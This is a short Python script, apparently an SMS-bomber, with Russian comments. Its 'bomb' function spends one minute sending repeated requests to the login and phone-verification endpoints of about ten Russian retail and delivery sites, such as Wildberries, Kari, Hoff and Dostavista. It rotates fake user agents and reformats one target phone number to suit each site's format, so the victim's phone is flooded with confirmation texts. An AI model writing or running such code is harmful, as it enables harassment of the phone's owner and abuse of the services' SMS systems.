import requests, time, fake_useragent
import datetime
def bomb(number):
    t_end = time.time() + 60 *1
    
    while time.time() < t_end:
        user = fake_useragent.UserAgent().random#Создаем фэйковый юзер агент
        head = {'user_agent' : user}
        try:
            response = requests.post('https://backend.tokio.market/api/auth/check-user', data={'phone':number}, headers=head)#Токио кафе
            
        except Exception as e:
            print(e)
            
        try:
            a = list(number)
            a.insert(2, " ")
            a.insert(6, " ")
            a.insert(10, "-")
            a.insert(13, "-")
            phone = "".join(a)
            response = requests.post('https://ololol.ru/local/components/custom/auth.authorize/templates/.default/ajax.php', headers=head, data={'action': 'submit', 'SUCCESS_URL': '/personal/', 'phone': phone})#Магазин одежды OLOLOL
            
        except Exception as e:
            print(e)
            
        try:
            response = requests.post('https://www.wildberries.ru/mobile/requestconfirmcode?forAction=EasyLogin', headers=head, data={'phoneMobile': number[1:]})# Wildberies
            
        except Exception as e:
            print(e)
            
        try:
            response = requests.post('https://i.api.kari.com/ecommerce/client/v2/phone/verify', headers=head, data={'phone': number})# Kari
            
        except Exception as e:
            print(e)
            
        try:
            a = list(number)
            a.insert(2, " ")
            a.insert(6, " ")
            a.insert(10, " ")
            a.insert(13, " ")
            phone = "".join(a)
            response = requests.post('https://hoff.ru/vue/register/', headers=head, data={'phone': phone})# Kari
           
        except Exception as e:
            print(e)
        try:
            #+7 (961) 864-78-55
            a = list(number)
            a.insert(2, " (")
            a.insert(6, ") ")
            a.insert(10, "-")
            a.insert(13, "-")
            phone = "".join(a)
            response = requests.post('https://www.rbt.ru/user/sendCode/', headers=head, data={'phone': phone})
        except Exception as e:
            print(e)
            
        try:
            response = requests.post('https://api2.leomax.ru/auth/authcode', headers=head, data={'phone': number})
        except Exception as e:
            print(e)
            
        try:
            a = list(number)
            a.remove("+")
            phone = "".join(a)
            response = requests.post('https://api2.leomax.ru/auth/authcode', headers=head, data={'phone': phone, "format": "webotp"})
        except Exception as e:
            print(e)
            
        
        try:
            response = requests.post('https://x100ecommerce-api-customers.azurewebsites.net/v1/SendCode', headers=head, data={'retailNetworkId': "A79C5050-1EE7-11EB-9B6E-05B5FC40DF2A", 'recipient': number, 'source': "WEB"})
        except Exception as e:
            print(e)
            
        
       
            
        try:
            a = list(number)
            a.pop(0)
            a.pop(0)
            a.insert(3, " ")
            a.insert(7, "-")
            a.insert(10, "-")
            phone = "".join(a)
            response = requests.post('https://dostavista.ru/user/send-sms', headers=head, data={'phone': phone, 'source': "signup"})
        except Exception as e:
            print(e)